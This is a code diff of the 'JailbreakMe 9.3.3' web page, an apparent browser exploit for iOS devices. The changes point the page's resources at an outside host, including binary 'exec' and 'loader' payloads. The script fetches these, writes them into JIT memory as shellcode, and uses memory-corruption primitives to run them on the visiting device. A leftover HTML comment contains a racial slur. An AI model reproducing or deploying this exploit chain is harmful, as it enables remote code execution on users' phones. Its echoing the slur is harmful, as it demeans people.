@@ -226,13 +226,13 @@
  Punk nigga!
  
 --!>
- <html manifest="off.appcache">
+ <html manifest="https://jbme.qwertyoruiop.com/off.appcache">
  <head>
  <title>JailbreakMe 9.3.3</title>
  <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
  <meta name="apple-mobile-web-app-capable" content="no">
  <meta name="format-detection" content="telephone=no">
- <link rel="apple-touch-icon" href="touch-icon-iphone.png">
+ <link rel="apple-touch-icon" href="https://jbme.qwertyoruiop.com/touch-icon-iphone.png">
  <meta name="apple-mobile-web-app-title" content="JailbreakMe" />
 <style>
  body {
@@ -289,7 +289,7 @@ footer {
  	mem2[0] = val;
  	mem0[4] = mem1;
  }
- filestream = load_binary_resource("exec")
+ filestream = load_binary_resource("https://jbme.qwertyoruiop.com/exec")
  var shll = new Uint32Array(filestream.length / 4);
  for (var i = 0; i < filestream.length;) {
  	var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
@@ -375,7 +375,7 @@ footer {
  		}
  	}
  	var shc = jitf;
- 	var filestream = load_binary_resource("loader")
+ 	var filestream = load_binary_resource("https://jbme.qwertyoruiop.com/loader")
  	for (var i = 0; i < filestream.length;) {
  		var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
  		write4(shc, word);
